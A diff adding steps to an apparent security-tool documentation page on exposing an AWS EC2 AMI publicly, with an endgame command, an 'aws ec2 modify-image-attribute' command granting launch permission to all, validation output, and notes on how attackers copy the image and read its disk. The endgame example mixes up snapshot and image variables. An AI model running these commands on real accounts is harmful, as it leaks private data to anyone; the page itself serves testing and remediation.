@@ -2,9 +2,53 @@
 
 ## Steps to Reproduce
 
+* To expose the resource using `endgame`, run the following from the victim account:
+
+```bash
+export EVIL_PRINCIPAL=*
+export IMAGE_ID=ami-5731123e
+
+endgame expose --service ebs --name $SNAPSHOT_ID
+```
+
+* To expose the resource using AWS CLI, run the following from the victim account:
+
+```bash
+aws ec2 modify-image-attribute \
+    --image-id ami-5731123e \
+    --launch-permission "Add=[{Group=all}]"
+```
+
+* To validate that the resource has been shared publicly, run the following:
+
+```bash
+aws ec2 describe-image-attribute \
+    --image-id ami-5731123e \ 
+    --attribute launchPermission
+```
+
+* Observe that the contents of the exposed AMI match the example shown below.
+
 ## Example
 
+The output of `aws ec2 describe-image-attribute` reveals that the AMI is public if the value of "Group" under "LaunchPermissions" is equal to "all"
+
+```
+{
+    "LaunchPermissions": [
+        {
+            "Group": "all"
+        }
+    ],
+    "ImageId": "ami-5731123e",
+}
+```
+
 ## Exploitation
+
+After an EC2 AMI is made public, an attacker can then:
+* [Copy the AMI](https://docs.aws.amazon.com/cli/latest/reference/ec2/copy-image.html) into their own account
+* Launch an EC2 instance using that AMI and browse the contents of the disk, potentially revealing sensitive or otherwise non-public information.
 
 ## Remediation
 
@@ -22,3 +66,4 @@ Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaini
 ## References
 
 - [aws ec2 modify-image-attribute](https://docs.aws.amazon.com/cli/latest/reference/ec2/modify-image-attribute.html)
+- [aws ec2 describe-image-attribute](https://docs.aws.amazon.com/cli/latest/reference/ec2/describe-image-attribute.html)
